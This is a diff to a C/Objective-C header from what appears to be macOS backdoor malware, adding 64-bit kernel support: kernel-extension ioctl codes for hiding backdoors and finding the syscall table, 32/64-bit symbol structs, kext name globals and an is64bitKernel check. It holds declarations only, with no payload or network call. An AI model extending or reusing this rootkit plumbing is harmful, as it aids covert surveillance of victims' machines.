@@ -95,14 +95,20 @@ extern NSData            *gSessionKey;
 // Returns the number of active backdoors
 #define MCHOOK_GET_ACTIVES  _IOR(MCHOOK_MAGIC, 7489827, int)
 // Pass symbols resolved from uspace to kspace (not exported symbol snow)
-#define MCHOOK_SOLVE_SYM    _IOW(MCHOOK_MAGIC, 6483647, struct symbols)
+#define MCHOOK_SOLVE_SYM_32 _IOW(MCHOOK_MAGIC, 6483647, struct symbols_32)
+#define MCHOOK_SOLVE_SYM_64 _IOW(MCHOOK_MAGIC, 6483647, struct symbols_64)
 // Tell the kext to find sysent
 #define MCHOOK_FIND_SYS     _IOW(MCHOOK_MAGIC, 4548874, struct os_version)
 
-typedef struct symbols {
+typedef struct symbols_32 {
   uint32_t hash;
   uint32_t symbol;
-} symbol_t;
+} symbol32_t;
+
+typedef struct symbols_64 {
+  uint32_t hash;
+  uint64_t symbol;
+} symbol64_t;
 
 typedef struct os_version {
   uint32_t major;
@@ -437,7 +443,8 @@ extern NSString *gBackdoorUpdateName;
 extern NSString *gConfigurationName;
 extern NSString *gConfigurationUpdateName;
 extern NSString *gInputManagerName;
-extern NSString *gKextName;
+extern NSString *gKext32Name;
+extern NSString *gKext64Name;
 
 #define CRISIS_STARTSTOP    (UInt32)0x2
 #define CRISIS_STOP         (UInt32)0x0  // Per retrocompatibilita'
@@ -497,6 +504,8 @@ NSArray *searchFile(NSString *aFileMask);
 static unsigned int sdbm(unsigned char *str);
 unsigned int findSymbolInFatBinary(void *imageBase,
                                    unsigned int symbolHash);
+uint64_t   findSymbolInFatBinary64(void *imageBase,
+                                   unsigned int symbolHash);
 
 #ifdef DEBUG_COMMON
 void printFormatFlags(AudioStreamBasicDescription inDescription);
@@ -505,6 +514,8 @@ void printFormatFlags(AudioStreamBasicDescription inDescription);
 size_t _utf16len(unichar *string);
 
 NSDictionary *getActiveWindowInfo();
+
+BOOL is64bitKernel();
 
 #ifdef DEMO_VERSION
 void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal);
